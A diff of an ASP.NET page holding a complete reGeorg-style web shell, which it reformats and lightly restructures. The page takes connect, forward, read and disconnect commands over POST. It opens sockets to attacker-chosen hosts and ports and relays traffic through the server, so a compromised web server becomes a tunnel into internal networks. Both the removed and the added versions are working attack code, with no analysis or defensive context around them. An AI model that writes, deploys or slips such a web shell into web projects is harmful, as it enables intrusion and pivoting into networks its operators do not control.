@@ -2,100 +2,97 @@
 <%@ Import Namespace="System.Net" %>
 <%@ Import Namespace="System.Net.Sockets" %>
 <%
-try
-{
-    if(Request.HttpMethod=="POST")
+    try
     {
-        string cmd=Request.QueryString["cmd"];
-        if(cmd=="connect")
+        if (Request.HttpMethod == "POST")
         {
-            try
+            string cmd = Request.QueryString["cmd"];
+            if (cmd == "connect")
             {
-                string target=Request.QueryString["target"];
-                int port=int.Parse(Request.QueryString["port"]);
-                IPAddress ip=IPAddress.Parse(target);
-                IPEndPoint ep=new IPEndPoint(ip,port);
-                Socket s=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
-                s.Connect(ep);
-                s.Blocking=false;
-                Session["sock"]=s;
-                Response.AddHeader("X-STATUS","OK");
-            }
-            catch(Exception ex)
-            {
-                Response.AddHeader("X-ERROR",ex.Message);
-                Response.AddHeader("X-STATUS","FAIL");
-            }
-        }
-        else if(cmd=="disconnect")
-        {
-            try{((Socket)Session["sock"]).Close();}catch{}
-            Session.Abandon();
-            Response.AddHeader("X-STATUS","OK");
-        }
-        else if(cmd=="forward")
-        {
-            Socket s=(Socket)Session["sock"];
-            try
-            {
-                int l=Request.ContentLength;
-                byte[] b=new byte[l];
-                int r=0;
-                while((r=Request.InputStream.Read(b,0,b.Length))>0)
-                {
-                    s.Send(b, r, SocketFlags.None);
-                }
-                Response.AddHeader("X-STATUS","OK");
-            }
-            catch(Exception ex)
-            {
-                Response.AddHeader("X-ERROR",ex.Message);
-                Response.AddHeader("X-STATUS","FAIL");
-            }
-        }
-        else if(cmd=="read")
-        {
-            Socket s=(Socket)Session["sock"];
-            try
-            {
-                byte[] buf=new byte[512];
-                int c=0;
                 try
                 {
-                    while((c=s.Receive(buf))>0)
-                    {
-                        byte[] outb=new byte[c];
-                        Buffer.BlockCopy(buf,0,outb,0,c);
-                        Response.BinaryWrite(outb);
-                    }
-                    Response.AddHeader("X-STATUS","OK");
+                    string target = Request.QueryString["target"];
+                    int port = int.Parse(Request.QueryString["port"]);
+                    IPAddress ip = IPAddress.Parse(target);
+                    IPEndPoint ep = new IPEndPoint(ip, port);
+                    Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    s.Connect(ep);
+                    s.Blocking = false;
+                    Session["sock"] = s;
+                    Response.AddHeader("X-STATUS", "OK");
                 }
-                catch(SocketException)
+                catch (Exception ex)
                 {
-                    Response.AddHeader("X-STATUS","OK");
-                    return;
+                    Response.AddHeader("X-ERROR", ex.Message);
+                    Response.AddHeader("X-STATUS", "FAIL");
                 }
             }
-            catch(Exception ex)
+            else if (cmd == "disconnect")
             {
-                Response.AddHeader("X-ERROR",ex.Message);
-                Response.AddHeader("X-STATUS","FAIL");
+                try {
+                    Socket s = (Socket)Session["sock"];
+                    s.Close();
+                } catch {}
+                Session.Abandon();
+                Response.AddHeader("X-STATUS", "OK");
+            }
+            else if (cmd == "forward")
+            {
+                Socket s = (Socket)Session["sock"];
+                try
+                {
+                    byte[] buffer = new byte[Request.ContentLength];
+                    int bytesRead = 0;
+                    while ((bytesRead = Request.InputStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        s.Send(buffer, bytesRead, SocketFlags.None);
+                    }
+                    Response.AddHeader("X-STATUS", "OK");
+                }
+                catch (Exception ex)
+                {
+                    Response.AddHeader("X-ERROR", ex.Message);
+                    Response.AddHeader("X-STATUS", "FAIL");
+                }
+            }
+            else if (cmd == "read")
+            {
+                Socket s = (Socket)Session["sock"];
+                try
+                {
+                    byte[] readBuf = new byte[512];
+                    int count = 0;
+                    try
+                    {
+                        while ((count = s.Receive(readBuf)) > 0)
+                        {
+                            byte[] actual = new byte[count];
+                            Buffer.BlockCopy(readBuf, 0, actual, 0, count);
+                            Response.BinaryWrite(actual);
+                        }
+                        Response.AddHeader("X-STATUS", "OK");
+                    }
+                    catch (SocketException)
+                    {
+                        Response.AddHeader("X-STATUS", "OK");
+                        return;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Response.AddHeader("X-ERROR", ex.Message);
+                    Response.AddHeader("X-STATUS", "FAIL");
+                }
             }
         }
         else
         {
-            Response.StatusCode=404;
-            Response.End();
+            Response.Write("Georg says, 'All seems fine'");
         }
     }
-    else
+    catch (Exception ex)
     {
-        Response.Write("Georg says, 'All seems fine'");
+        Response.AddHeader("X-ERROR", ex.Message);
+        Response.AddHeader("X-STATUS", "FAIL");
     }
-}
-catch(Exception ex)
-{
-    Response.AddHeader("X-ERROR",ex.Message);
-    Response.AddHeader("X-STATUS","FAIL");
-}
 %>
